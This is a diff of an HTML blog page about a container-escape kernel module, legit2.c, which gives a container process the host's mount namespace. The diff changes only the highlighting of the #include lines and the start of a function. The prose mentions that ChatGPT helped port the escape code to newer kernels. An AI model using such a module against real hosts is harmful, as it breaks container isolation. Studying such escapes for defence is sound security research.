@@ -181,12 +181,12 @@
 
 <p>The code provided in the Pulse blog doesn’t work on modern Linux kernels, due to a change in function signature, but with a little help from ChatGPT, it was possible to get a version which works fine on the Linux 5.15 kernel in Ubuntu 22.04. In this case I’ve called the source code <code class="language-plaintext highlighter-rouge">legit2.c</code>. This code will essentially cause a process to get the mount namespace of the host when triggered by writing to <code class="language-plaintext highlighter-rouge">/proc/legit</code> in the container.</p>
 
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;linux/module.h&gt;
-#include &lt;linux/kernel.h&gt;
-#include &lt;linux/cred.h&gt;
-#include &lt;linux/fs_struct.h&gt;
-#include &lt;linux/sched/task.h&gt;
-#include &lt;linux/proc_fs.h&gt;
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;linux/module.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/kernel.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/cred.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/fs_struct.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/sched/task.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/proc_fs.h&gt;</span><span class="cp">
 </span>
 <span class="kt">void</span> <span class="nf">tweak_fs_struct</span><span class="p">(</span><span class="k">struct</span> <span class="n">fs_struct</span> <span class="o">*</span> <span class="n">dest</span><span class="p">,</span> <span class="k">struct</span> <span class="n">fs_struct</span> <span class="o">*</span> <span class="n">source</span><span class="p">){</span>
     <span class="k">if</span> <span class="p">(</span><span class="n">dest</span><span class="p">)</span> <span class="p">{</span>
